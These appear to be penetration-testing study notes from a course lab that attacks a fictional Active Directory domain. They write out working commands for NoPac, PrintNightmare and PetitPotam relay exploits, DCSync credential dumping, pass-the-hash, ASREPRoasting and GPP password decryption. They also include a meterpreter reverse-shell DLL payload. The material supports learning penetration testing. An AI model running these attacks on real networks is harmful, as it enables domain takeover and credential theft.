## Moving around a Domain 
RDP
[Powershell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2)
	Windows Remote management
MSSQL Server. 

**Priviliges to look for **
- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

### RDP 
Sometimes you may not have admin rights but can RDP to another machine
#### using Powerview 
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
Be able to see what users can RDP to this host.
#### Bloodhound 
![[BloodHound.png]]
### WinRM
#### PowerView
```powershell
 Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
Remote Management Users was to enable WinRM without local admin access.

#### BloodHound
Custom cypher query
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
Add as a custom query
![[Bloddhound custom query.png]]

#### Establishing WinRm Sessions from Windows 
```powershell
$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force

$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password)

Enter-PSSession -ComputerName MS01 -Credential $cred
```
#### From Linux
```shell
evil-winrm -i 10.129.201.234 -u forend
```

### SQL Server Admins
#### Bloodhound Custom Query 
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
#### Connecting the MSSQL
##### PowerUp SQL Windows
Hunt for SQL server Instances
```powershell
cd .\PowerUpSQL\

Import-Module .\PowerUpSQL.ps1
```

```powershell
Get-SQLInstanceDomain
```
Authenticate against MSQQL Services 
```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

##### MSSQL Client Linux
```shell
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
#### SeImpersonate 
```shell
enable_xp_cmdshell
```
JuciyPotato, PrintSpoofer, RoguePotato etc.
```shell
xp_cmdshell whoami /priv
```

## Kerberos "Double Hop" Problem
Problem when attempting to user kerberos over to or more hops. 

Occurs in WinRM/Powershell
![[Kerberos double hop.png]]

### Workarounds 
https://posts.slayerlabs.com/double-hop/
#### PSCredential Object 
Within a WINRM session
```shell
import-module .\PowerView.ps1
```

```powershell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
```

```shell
get-domainuser -spn -credential $Cred | select samaccountname
```

#### Register PSSession Configuration 
Establish a WINRM Session
```powershell
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

```powershell
Import-Module .\PowerView.ps1
```

```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

```powershell
 Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```

```powershell
get-domainuser -spn | select samaccountname
```
#### Note
We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount further attacks against hosts in the environment. .

## Bleeding Edge Vulns
### NoPac (Sam Account Name Spoofing)
[Sam_The_Admin vuln](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)
#### Description 
Encompsess two CVEs;
	[2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
	[2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
	
|42278|42287|
|---|---|
|`42278` is a bypass vulnerability with the Security Account Manager (SAM).|`42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|

1. By default authenticated users can add up to 10 computers to a domain.

2. Change the name of the new host to match the DC SamAccountName.

3. Request a new kerberos ticket, causes the service to issue tickets under the DCs name. 

4. Have access as that service and may be provided with a system level shell on a DC.

https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware

[Link to POC](about:blank)

Need to ensure impacket is installed

#### Running the Exploit 
```shell
git clone https://github.com/Ridter/noPac.git
```
Scanning for NoPac
```shell
 sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
Running NoPac
```shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
Will need to use exact paths with smbexec.py

*Does not save the TGT in the directory on the attack host.*

DCSync the Built-In Admin Account
```shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
#### Considerations
Windows Defender or another AV will likely block commands. 
### Print Nightmare
#### Description
Nickname given to two vulns
[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)
#### Running the exploit
```shell
git clone https://github.com/cube0x0/CVE-2021-1675.git
```
May need to use another version of Impacket
```shell
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
Check if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
```shell
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Generate a DLL payload 
```shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
Transfer the file across
Start Multi handler
```shell
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 
```

### PetitPotam  (MS-EFSRPC)
#### Description 
[CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)
LSA Spoofing Vuln that was patched in August 2021
Allows unautenticated attacker to trick a DC to authenticate against another NTLM over port 445 via [LSARPC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc)

[Blog post](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)

#### Running the exploit
Starting ntlmmrelayx.py
*Need to specify the web enrolment ID for the CA*
Use [Certi](https://github.com/zer1t0/certi) if needed
```shell
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

In another window Run [petiPotam](https://github.com/topotam/PetitPotam)

```shell
python3 PetitPotam.py 172.16.5.225 172.16.5.5     
```
Can run from mimikatz
```cmd
misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>
```
Catch the Base64 Encoded Certificate 
```shell-session
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMII<snip>70+e0p2GZNVZDXlrwQIyr7YCKBdGmY=
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
```

Request a TGT using gettgtpkinit.py 
```shell-session
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
Set the KRB5CCNAME Variable 
```shell
export KRB5CCNAME=dc01.ccache
```
Use DC TGT to DCSync
```shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
or 
```shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
Confirm Admin Access
```shell
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```
##### Alternate Route
Submitting a TGS request ourselves
```shell
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
DC Sync 
```shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
#### Alternate Route 2
Request TGT and Peform PTT with DC01
```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```
Confirm ticket is in memory
```powershell
klist
```
Perform DCSync with Mimilatz
```powershell
 lsadump::dcsync /user:inlanefreight\krbtgt
```
## Misconfigurations 
### Miscellaneous Misconfigurations
#### Exchange Related group Membership 
Exchange Windows Permissions is not listed as a protected group but members are granted the ability to wrote a DACL.
Can give a user DCSync privileges
[Git Repo](https://github.com/gdedrouas/Exchange-AD-Privesc)

Organisation Management is another powerful group Effectively Domain Admins of the exchange. 
Compromising this will often lead to Domain Admin priviliges. 
Dumping creds in memory from the exchange server will likely produce lots of passwords. 

#### Priv Exchange 
Allows any Domain user with a mailbox to force the Exchange server to authenticate to any host by the client over HTTP.
Can relay LDAP and dump the domain NTDS database. 

#### Printer Bug 
Flaw in `MS-RPRN`
Force the server to authenticate any host by the client over SMB.
Can grant the account DCSync privliges. 
Use the tool [Get-SpoolStatus](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment)

```powershell
Import-Module .\SecurityAssessment.ps1
```
```powershell
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

#### MS14-068
Elevate privileges to domain admin
Forged PAC to be accepted by the KDC algorithm. Can the nmake a fake PAC presenting a user as a member of Domain Admins. 
[Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)or Impacket

#### Sniffing LDAP Credentials
Many applications and printers store LDAP credentials in their web admin console to connect to the domain. 
Sometimes they can be viewed in cleartext. 
[Example](https://grimhacker.com/2018/03/09/just-a-printer/)

#### Enumerating DNS Records
[Dump all DNS records](https://github.com/dirkjanm/adidnsdump) using a valid domain user account 
Helps with namition conventions for tools such as a bloodhound. 
```shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
```

Resolve Unknown Records
```shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
### Other Misconfigurations 
#### Password in Description Field
Using PowerView 
```powershell
Import-Module ./PowerView
```

```powershell
 Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
#### PASSWD_NOTREQD Field

Domain accounts with passwd notreqd field set in the UAC attribute. 
Means a user is not subject to current password policy length. Means they can have shorted passwords or no password. 
PowerView:
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

#### Credentials in SMB Shares and SYSVOL Scripts
```powershell
 ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\
```
Many scripts may contain passwords for local admin accounts

#### Group Policy Preferences (GPP) Passwords
When a new GPP is created a .xml is created in the SYSVOL share
- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

cpassword attribute contains passwords encypted with AES 256. The key is [online](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)

Was patching in [2014](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30)

Can decrypt password with:
```shell
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

Locating and Retrieving GPP passwords with CME
```shell
crackmapexec smb -L | grep gpp
```

CME gpp_autologin 
```shell
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

#### ASREPRoasting
Possible to gain the TGT for any account that has the `Do not requre pre-authentication` [setting](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) enabled.
Authentication server reply is encrypted with user accounts password. The DC decrypts this to validate correct password.

With the dont require enabled an attacker can request authentication data

View account with Dont Require Kerberos Pre Auth:
![[AD Kerberos Preauth.png]]

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
Retrieve AS-REP Format
```powershell
 .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
Cracking hash
```shell
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```
##### Alternate Methods
```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
Hunt for users with kerbroas PreAuth not required
```shell
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
#### GPO Abuse
GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions
##### Enumerate GPO names with PowerView
```powershell
Get-DomainGPO |select displayname
```
##### Enumerate GPO names with built in CMDlet
```powershell
et-GPO -All | Select DisplayName
```
##### Enumerate Domain User GPO RIghts
```powershell
sid=Convert-NameToSid "Domain Users"

Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
##### Covert GPO GUID to name
```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
##### Abuse
[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

